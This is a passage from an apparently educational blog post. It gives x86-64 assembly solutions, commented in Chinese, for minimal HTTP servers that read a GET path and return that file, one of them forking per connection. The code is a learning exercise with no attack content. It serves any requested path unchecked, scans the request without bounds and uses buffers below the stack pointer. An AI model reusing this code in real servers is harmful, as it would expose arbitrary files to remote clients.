class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.globl _start</span><br><span class="line"></span><br><span class="line">.section .text</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">    # 创建套接字，AF_INET = 2, SOCK_STREAM = 1, IPPROTO_IP = 0</span><br><span class="line">    mov rax, 41            # syscall: socketcall (socket)</span><br><span class="line">    mov rdi, 2             # AF_INET</span><br><span class="line">    mov rsi, 1             # SOCK_STREAM</span><br><span class="line">    mov rdx, 0             # IPPROTO_IP</span><br><span class="line">    syscall</span><br><span class="line">    # 存储套接字描述符，应为3</span><br><span class="line">    mov rdi, rax           # 保存套接字描述符，rax 执行syscall 后保存 函数返回值</span><br><span class="line"></span><br><span class="line">    # 准备bind的系统调用</span><br><span class="line">    # 准备 socketaddr_in</span><br><span class="line">    sub rsp, 16            # 分配16字节的空间用于sockaddr_in结构</span><br><span class="line">    mov word ptr [rsp], 2  # sa_family = AF_INET</span><br><span class="line">    mov word ptr [rsp+2], 0x5000  # 端口号80 (htons(80))</span><br><span class="line">    mov dword ptr [rsp+4], 0      # 地址 0.0.0.0 (INADDR_ANY)</span><br><span class="line"></span><br><span class="line">    # bind函数调用</span><br><span class="line">    mov rax, 49            # syscall: bind</span><br><span class="line">    mov rsi, rsp           # 第二个参数指向sockaddr_in结构</span><br><span class="line">    mov rdx, 16            # 第三个参数为sockaddr_in结构的大小</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    # listening 函数调用</span><br><span class="line">    mov rax, 50            # syscall: listen</span><br><span class="line">    mov rsi, 0             # backlog = 0, 允许的挂起连接数</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    # accept 函数调用</span><br><span class="line">    mov rax, 43</span><br><span class="line">    mov rdi, 3</span><br><span class="line">    mov rsi, 0</span><br><span class="line">    mov rdx, 0</span><br><span class="line">    syscall</span><br><span class="line">    mov rbx, rax           # 保存接受连接的套接字描述符</span><br><span class="line"></span><br><span class="line">    # read 读取数据</span><br><span class="line">    mov rax, 0               # syscall: read</span><br><span class="line">    mov rdi, rbx             # 使用接受的套接字描述符</span><br><span class="line">    lea rsi, [rsp-512]       # &lt;read_request&gt; 指向缓冲区，预留空间</span><br><span class="line">    mov rdx, 512             # &lt;read_request_count&gt; 读取的最大字节数</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    # 提取路径</span><br><span class="line">    lea rdi, [rsp-512+4]     # 跳过 &quot;GET &quot; 到路径起始处</span><br><span class="line">    mov rcx, rdi             # 复制地址到rcx，用于查找路径结束</span><br><span class="line"></span><br><span class="line">find_end_of_path:</span><br><span class="line">    cmp byte ptr [rcx], 0x20 # 比较空格字符 (ASCII 32)</span><br><span class="line">    je end_of_path_found</span><br><span class="line">    inc rcx</span><br><span class="line">    jmp find_end_of_path</span><br><span class="line"></span><br><span class="line">end_of_path_found:</span><br><span class="line">    mov byte ptr [rcx], 0    # 在路径结尾放置null字符终止路径字符串</span><br><span class="line"></span><br><span class="line">    # 打开文件</span><br><span class="line">    mov rax, 2               # syscall: open</span><br><span class="line">    mov rdi, rdi             # rdi 已经包含路径的起始地址</span><br><span class="line">    xor rsi, rsi             # O_RDONLY</span><br><span class="line">    syscall</span><br><span class="line">    test rax, rax            # 测试返回值以检查错误</span><br><span class="line">    js exit_failure          # 如果返回值为负，跳转到错误处理</span><br><span class="line"></span><br><span class="line">    # 成功打开文件</span><br><span class="line">    mov r12, rax             # 保存文件描述符</span><br><span class="line"></span><br><span class="line">    # 读取文件 read(5, &lt;read_file&gt; at [rsp - 1024], &lt;read_file_count&gt;) = &lt;read_file_result&gt;</span><br><span class="line">    mov rdi, rax             # 保存文件描述符</span><br><span class="line">    mov rax, 0               # syscall: read</span><br><span class="line">    lea rsi, [rsp-1024]      # 指向缓冲区</span><br><span class="line">    mov rdx, 1024            # 读取的最大字节数</span><br><span class="line">    syscall</span><br><span class="line">    # 成功读取文件，返回读取到的字节数</span><br><span class="line">    mov r15, rax</span><br><span class="line"></span><br><span class="line">    # close(5) = 0</span><br><span class="line">    mov rax, 3</span><br><span class="line">    mov rdi, r12             # 使用正确的文件描述符</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    # write(4, &quot;HTTP/1.0 200 OK\r\n\r\n&quot;, 19) = 19</span><br><span class="line">    # write 发送HTTP响应</span><br><span class="line">    mov rax, 1               # syscall: write</span><br><span class="line">    mov rdi, rbx             # 使用接受的套接字描述符</span><br><span class="line">    lea rsi, [response]      # 响应内容的位置</span><br><span class="line">    mov rdx, 19              # 响应内容长度</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    # write(4, &lt;write_file&gt;, &lt;write_file_count&gt;) = &lt;write_file_result&gt;</span><br><span class="line">    # write 发送读取到的文件内容</span><br><span class="line">    mov rax, 1               # syscall: write</span><br><span class="line">    mov rdi, rbx             # 使用接受的套接字描述符</span><br><span class="line">    lea rsi, [rsp-1024]      # 指向缓冲区 write_file</span><br><span class="line">    mov rdx, r15             # 写入的长度</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    # 关闭接受连接的套接字</span><br><span class="line">    mov rax, 3               # syscall: close</span><br><span class="line">    mov rdi, rbx             # 文件描述符</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    jmp exit_success         # 跳转到成功退出</span><br><span class="line"></span><br><span class="line">    # 标签定义</span><br><span class="line">exit_failure:</span><br><span class="line">    # 失败退出</span><br><span class="line">    mov rax, 60            # syscall: exit</span><br><span class="line">    mov rdi, 1             # exit status 1</span><br><span class="line">    syscall                # 执行退出</span><br><span class="line">    ret                    # 从程序返回</span><br><span class="line"></span><br><span class="line">exit_success:</span><br><span class="line">    # 正常退出</span><br><span class="line">    mov rax, 60            # syscall: exit</span><br><span class="line">    xor rdi, rdi           # exit status 0</span><br><span class="line">    syscall                # 执行退出</span><br><span class="line">    ret                    # 从程序返回</span><br><span class="line"></span><br><span class="line">.section .data</span><br><span class="line">response:</span><br><span class="line">    .ascii &quot;HTTP/1.0 200 OK\r\n\r\n&quot;</span><br><span class="line"></span><br><span class="line">.section .bss</span><br><span class="line">    .space 512              # 分配512字节的缓冲区l</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="1-7-Program-that-dynamically-responds-to-multiple-HTTP-GET-requests"><a href="#1-7-Program-that-dynamically-responds-to-multiple-HTTP-GET-requests" class="headerlink" title="1.7 Program that dynamically responds to multiple HTTP GET requests"></a>1.7 Program that dynamically responds to multiple HTTP GET requests</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.globl _start</span><br><span class="line"></span><br><span class="line">.section .text</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line"># socket(AF_INET, SOCK_STREAM, IPPROTO_IP) = 3</span><br><span class="line">    # 创建套接字，AF_INET = 2, SOCK_STREAM = 1, IPPROTO_IP = 0</span><br><span class="line">    mov rax, 41            # syscall: socketcall (socket)</span><br><span class="line">    mov rdi, 2             # AF_INET</span><br><span class="line">    mov rsi, 1             # SOCK_STREAM</span><br><span class="line">    mov rdx, 0             # IPPROTO_IP</span><br><span class="line">    syscall</span><br><span class="line">    # 存储套接字描述符，应为3</span><br><span class="line">    mov rdi, rax           # 保存套接字描述符，rax 执行syscall 后保存 函数返回值</span><br><span class="line"></span><br><span class="line"># bind(3, &#123;sa_family=AF_INET, sin_port=htons(&lt;bind_port&gt;), sin_addr=inet_addr(&quot;&lt;bind_address&gt;&quot;)&#125;, 16) = 0</span><br><span class="line">    # 准备bind的系统调用</span><br><span class="line">    # 准备 socketaddr_in</span><br><span class="line">    sub rsp, 16            # 分配16字节的空间用于sockaddr_in结构</span><br><span class="line">    mov word ptr [rsp], 2  # sa_family = AF_INET</span><br><span class="line">    mov word ptr [rsp+2], 0x5000  # 端口号80 (htons(80))</span><br><span class="line">    mov dword ptr [rsp+4], 0      # 地址 0.0.0.0 (INADDR_ANY)</span><br><span class="line"></span><br><span class="line">    # bind函数调用</span><br><span class="line">    mov rax, 49            # syscall: bind</span><br><span class="line">    mov rsi, rsp           # 第二个参数指向sockaddr_in结构</span><br><span class="line">    mov rdx, 16            # 第三个参数为sockaddr_in结构的大小</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"># listen(3, 0) = 0</span><br><span class="line">    # listening 函数调用</span><br><span class="line">    mov rax, 50            # syscall: listen</span><br><span class="line">    mov rsi, 0             # backlog = 0, 允许的挂起连接数</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">accept_loop:</span><br><span class="line"># accept(3, NULL, NULL) = 4</span><br><span class="line">    # accept 函数调用</span><br><span class="line">    mov rax, 43</span><br><span class="line">    mov rdi, 3</span><br><span class="line">    mov rsi, 0</span><br><span class="line">    mov rdx, 0</span><br><span class="line">    syscall</span><br><span class="line">    mov rbx, rax           # 保存接受连接的套接字描述符</span><br><span class="line"></span><br><span class="line"># read(4, &lt;read_request&gt;, &lt;read_request_count&gt;) = &lt;read_request_result&gt;</span><br><span class="line">    # read 读取数据</span><br><span class="line">    mov rax, 0               # syscall: read</span><br><span class="line">    mov rdi, rbx             # 使用接受的套接字描述符</span><br><span class="line">    lea rsi, [rsp-512]       # &lt;read_request&gt; 指向缓冲区，预留空间</span><br><span class="line">    mov rdx, 512             # &lt;read_request_count&gt; 读取的最大字节数</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    # 提取路径</span><br><span class="line">    lea rdi, [rsp-512+4]     # 跳过 &quot;GET &quot; 到路径起始处</span><br><span class="line">    mov rcx, rdi             # 复制地址到rcx，用于查找路径结束</span><br><span class="line"></span><br><span class="line">find_end_of_path:</span><br><span class="line">    cmp byte ptr [rcx], 0x20 # 比较空格字符 (ASCII 32)</span><br><span class="line">    je end_of_path_found</span><br><span class="line">    inc rcx</span><br><span class="line">    jmp find_end_of_path</span><br><span class="line"></span><br><span class="line">end_of_path_found:</span><br><span class="line">    mov byte ptr [rcx], 0    # 在路径结尾放置null字符终止路径字符串</span><br><span class="line"></span><br><span class="line"># open(&quot;&lt;open_path&gt;&quot;, O_RDONLY) = 5</span><br><span class="line">    # 打开文件</span><br><span class="line">    mov rax, 2               # syscall: open</span><br><span class="line">    mov rdi, rdi             # rdi 已经包含路径的起始地址</span><br><span class="line">    xor rsi, rsi             # O_RDONLY: 0</span><br><span class="line">    syscall</span><br><span class="line">    test rax, rax            # 测试返回值以检查错误</span><br><span class="line">    js exit_failure          # 如果返回值为负，跳转到错误处理</span><br><span class="line"></span><br><span class="line">    # 成功打开文件</span><br><span class="line">    mov r12, rax             # 保存文件描述符</span><br><span class="line"></span><br><span class="line">    # 读取文件 read(5, &lt;read_file&gt; at [rsp - 1024], &lt;read_file_count&gt;) = &lt;read_file_result&gt;</span><br><span class="line">    mov rdi, rax             # 保存文件描述符</span><br><span class="line">    mov rax, 0               # syscall: read</span><br><span class="line">    lea rsi, [rsp-1024]      # 指向缓冲区</span><br><span class="line">    mov rdx, 1024            # 读取的最大字节数</span><br><span class="line">    syscall</span><br><span class="line">    # 成功读取文件，返回读取到的字节数</span><br><span class="line">    mov r15, rax</span><br><span class="line"></span><br><span class="line">    # close(5) = 0</span><br><span class="line">    mov rax, 3</span><br><span class="line">    mov rdi, r12             # 使用正确的文件描述符</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    # write(4, &quot;HTTP/1.0 200 OK\r\n\r\n&quot;, 19) = 19</span><br><span class="line">    # write 发送HTTP响应</span><br><span class="line">    mov rax, 1               # syscall: write</span><br><span class="line">    mov rdi, rbx             # 使用接受的套接字描述符</span><br><span class="line">    lea rsi, [response]      # 响应内容的位置</span><br><span class="line">    mov rdx, 19              # 响应内容长度</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    # write(4, &lt;write_file&gt;, &lt;write_file_count&gt;) = &lt;write_file_result&gt;</span><br><span class="line">    # write 发送读取到的文件内容</span><br><span class="line">    mov rax, 1               # syscall: write</span><br><span class="line">    mov rdi, rbx             # 使用接受的套接字描述符</span><br><span class="line">    lea rsi, [rsp-1024]      # 指向缓冲区 write_file</span><br><span class="line">    mov rdx, r15             # 写入的长度</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    # 关闭接受连接的套接字</span><br><span class="line">    mov rax, 3               # syscall: close</span><br><span class="line">    mov rdi, rbx             # 文件描述符</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    jmp accept_loop          # 跳转到接受新的连接</span><br><span class="line"></span><br><span class="line">    # 标签定义</span><br><span class="line">exit_failure:</span><br><span class="line">    # 失败退出</span><br><span class="line">    mov rax, 60            # syscall: exit</span><br><span class="line">    mov rdi, 1             # exit status 1</span><br><span class="line">    syscall                # 执行退出</span><br><span class="line">    ret                    # 从程序返回</span><br><span class="line"></span><br><span class="line">exit_success:</span><br><span class="line">    # 正常退出</span><br><span class="line">    mov rax, 60            # syscall: exit</span><br><span class="line">    xor rdi, rdi           # exit status 0</span><br><span class="line">    syscall                # 执行退出</span><br><span class="line">    ret                    # 从程序返回</span><br><span class="line"></span><br><span class="line">.section .data</span><br><span class="line">response:</span><br><span class="line">    .ascii &quot;HTTP/1.0 200 OK\r\n\r\n&quot;</span><br><span class="line"></span><br><span class="line">.section .bss</span><br><span class="line">    .space 512              # 分配512字节的缓冲区</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="1-9-Multi-processed-program-that-dynamically-responds-to-multiple-HTTP-GET-requests"><a href="#1-9-Multi-processed-program-that-dynamically-responds-to-multiple-HTTP-GET-requests" class="headerlink" title="1.9 Multi-processed program that dynamically responds to multiple HTTP GET requests"></a>1.9 Multi-processed program that dynamically responds to multiple HTTP GET requests</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.globl _start</span><br><span class="line"></span><br><span class="line">.section .text</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">    # socket(AF_INET, SOCK_STREAM, IPPROTO_IP) = 3</span><br><span class="line">    # 创建套接字，AF_INET = 2, SOCK_STREAM = 1, IPPROTO_IP = 0</span><br><span class="line">    mov rax, 41            # syscall: socketcall (socket)</span><br><span class="line">    mov rdi, 2             # AF_INET</span><br><span class="line">    mov rsi, 1             # SOCK_STREAM</span><br><span class="line">    mov rdx, 0             # IPPROTO_IP</span><br><span class="line">    syscall</span><br><span class="line">    # 存储套接字描述符，应为3</span><br><span class="line">    mov rdi, rax           # 保存套接字描述符，rax 执行syscall 后保存 函数返回值</span><br><span class="line"></span><br><span class="line">    # bind(3, &#123;sa_family=AF_INET, sin_port=htons(80), sin_addr=inet_addr(&quot;0.0.0.0&quot;)&#125;, 16) = 0</span><br><span class="line">    # 准备bind的系统调用</span><br><span class="line">    # 准备 socketaddr_in</span><br><span class="line">    sub rsp, 16            # 分配16字节的空间用于sockaddr_in结构</span><br><span class="line">    mov word ptr [rsp], 2  # sa_family = AF_INET</span><br><span class="line">    mov word ptr [rsp+2], 0x5000  # 端口号80 (htons(80))</span><br><span class="line">    mov dword ptr [rsp+4], 0      # 地址 0.0.0.0 (INADDR_ANY)</span><br><span class="line"></span><br><span class="line">    # bind函数调用</span><br><span class="line">    mov rax, 49            # syscall: bind</span><br><span class="line">    mov rsi, rsp           # 第二个参数指向sockaddr_in结构</span><br><span class="line">    mov rdx, 16            # 第三个参数为sockaddr_in结构的大小</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    # listen(3, 0) = 0</span><br><span class="line">    # listening 函数调用</span><br><span class="line">    mov rax, 50            # syscall: listen</span><br><span class="line">    mov rsi, 0             # backlog = 0, 允许的挂起连接数</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">accept_loop:</span><br><span class="line">    # accept(3, NULL, NULL) = 4</span><br><span class="line">    # accept 函数调用</span><br><span class="line">    mov rax, 43</span><br><span class="line">    mov rdi, 3</span><br><span class="line">    mov rsi, 0</span><br><span class="line">    mov rdx, 0</span><br><span class="line">    syscall</span><br><span class="line">    mov rbx, rax           # 保存接受连接的套接字描述符</span><br><span class="line"></span><br><span class="line">    # fork 函数调用</span><br><span class="line">    mov rax, 57</span><br><span class="line">    syscall</span><br><span class="line">    test rax, rax          # 测试返回值</span><br><span class="line">    js exit_failure        # 如果fork失败则退出</span><br><span class="line">    jz child_process       # 如果是子进程则跳转</span><br><span class="line"></span><br><span class="line">    # 父进程</span><br><span class="line">    mov rax, 3             # syscall: close</span><br><span class="line">    mov rdi, rbx           # 关闭已接受的连接</span><br><span class="line">    syscall</span><br><span class="line">    jmp accept_loop        # 跳转到接受新的连接</span><br><span class="line"></span><br><span class="line">child_process:</span><br><span class="line">    # 关闭监听套接字</span><br><span class="line">    mov rax, 3             # syscall: close</span><br><span class="line">    mov rdi, 3             # 关闭监听套接字</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    # read(4, &lt;read_request&gt;, &lt;read_request_count&gt;) = &lt;read_request_result&gt;</span><br><span class="line">    # read 读取数据</span><br><span class="line">    mov rax, 0             # syscall: read</span><br><span class="line">    mov rdi, rbx           # 使用接受的套接字描述符</span><br><span class="line">    lea rsi, [rsp-512]     # &lt;read_request&gt; 指向缓冲区，预留空间</span><br><span class="line">    mov rdx, 512           # &lt;read_request_count&gt; 读取的最大字节数</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    # 提取路径</span><br><span class="line">    lea rdi, [rsp-512+4]   # 跳过 &quot;GET &quot; 到路径起始处</span><br><span class="line">    mov rcx, rdi           # 复制地址到rcx，用于查找路径结束</span><br><span class="line"></span><br><span class="line">find_end_of_path:</span><br><span class="line">    cmp byte ptr [rcx], 0x20 # 比较空格字符 (ASCII 32)</span><br><span class="line">    je end_of_path_found</span><br><span class="line">    inc rcx</span><br><span class="line">    jmp find_end_of_path</span><br><span class="line"></span><br><span class="line">end_of_path_found:</span><br><span class="line">    mov byte ptr [rcx], 0  # 在路径结尾放置null字符终止路径字符串</span><br><span class="line"></span><br><span class="line">    # open(&quot;&lt;open_path&gt;&quot;, O_RDONLY) = 5</span><br><span class="line">    # 打开文件</span><br><span class="line">    mov rax, 2             # syscall: open</span><br><span class="line">    mov rdi, rdi           # rdi 已经包含路径的起始地址</span><br><span class="line">    xor rsi, rsi           # O_RDONLY: 0</span><br><span class="line">    syscall</span><br><span class="line">    test rax, rax          # 测试返回值以检查错误</span><br><span class="line">    js exit_failure        # 如果返回值为负，跳转到错误处理</span><br><span class="line"></span><br><span class="line">    # 成功打开文件</span><br><span class="line">    mov r12, rax           # 保存文件描述符</span><br><span class="line"></span><br><span class="line">    # 读取文件 read(5, &lt;read_file&gt; at [rsp - 1024], &lt;read_file_count&gt;) = &lt;read_file_result&gt;</span><br><span class="line">    mov rdi, rax           # 保存文件描述符</span><br><span class="line">    mov rax, 0             # syscall: read</span><br><span class="line">    lea rsi, [rsp-1024]    # 指向缓冲区</span><br><span class="line">    mov rdx, 1024          # 读取的最大字节数</span><br><span class="line">    syscall</span><br><span class="line">    # 成功读取文件，返回读取到的字节数</span><br><span class="line">    mov r15, rax</span><br><span class="line"></span><br><span class="line">    # close(5) = 0</span><br><span class="line">    mov rax, 3</span><br><span class="line">    mov rdi, r12           # 使用正确的文件描述符</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    # write(4, &quot;HTTP/1.0 200 OK\r\n\r\n&quot;, 19) = 19</span><br><span class="line">    # write 发送HTTP响应</span><br><span class="line">    mov rax, 1             # syscall: write</span><br><span class="line">    mov rdi, rbx           # 使用接受的套接字描述符</span><br><span class="line">    lea rsi, [response]    # 响应内容的位置</span><br><span class="line">    mov rdx, 19            # 响应内容长度</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    # write(4, &lt;write_file&gt;, &lt;write_file_count&gt;) = &lt;write_file_result&gt;</span><br><span class="line">    # write 发送读取到的文件内容</span><br><span class="line">    mov rax, 1             # syscall: write</span><br><span class="line">    mov rdi, rbx           # 使用接受的套接字描述符</span><br><span class="line">    lea rsi, [rsp-1024]    # 指向缓冲区 write_file</span><br><span class="line">    mov rdx, r15           # 写入的长度</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    # 关闭接受连接的套接字</span><br><span class="line">    mov rax, 3             # syscall: close</span><br><span class="line">    mov rdi, rbx           # 文件描述符</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    # 正常退出</span><br><span class="line">    mov rax, 60            # syscall: exit</span><br><span class="line">    xor rdi, rdi           # exit status 0</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    # 标签定义</span><br><span class="line">exit_failure:</span><br><span class="line">    # 失败退出</span><br><span class="line">    mov rax, 60            # syscall: exit</span><br><span class="line">    mov rdi, 1             # exit status 1</span><br><span class="line">    syscall                # 执行退出</span><br><span class="line">    ret                    # 从程序返回</span><br><span class="line"></span><br><span class="line">.section .data</span><br><span class="line">response:</span><br><span class="line">    .ascii &quot;HTTP/1.0 200 OK\r\n\r\n&quot;</span><br><span class="line"></span><br><span class="line">.section .bss</span><br><span class="line">    .space 512             # 分配512字节的缓冲区</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="1-10-and-1-11-Multi-processed-program-that-dynamically-responds-to-multiple-HTTP-POST-GETrequests"><a href="#1-10-and-1-11-Multi-processed-program-that-dynamically-responds-to-multiple-HTTP-POST-GETrequests" class="headerlink" title="1.10 and 1.11 Multi-processed program that dynamically responds to multiple HTTP POST GETrequests"></a>1.10 and 1.11 Multi-processed program that dynamically responds to multiple HTTP POST GETrequests</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span 